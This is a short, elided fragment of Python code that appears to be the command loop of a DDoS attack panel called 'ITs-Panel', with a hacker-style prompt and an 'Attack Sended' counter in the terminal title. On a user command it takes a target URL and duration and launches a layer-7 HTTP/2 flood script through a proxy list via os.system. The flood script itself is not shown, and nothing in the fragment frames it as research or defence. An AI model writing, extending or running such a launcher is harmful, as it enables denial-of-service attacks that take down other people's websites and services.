...
""")
	...
	while True:
		sys.stdout.write("\x1b]2;[\] ITs-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;46mMrX@PANEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
...
""")
			...
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTP2.js {url} {time} 512 5 proxy.txt')
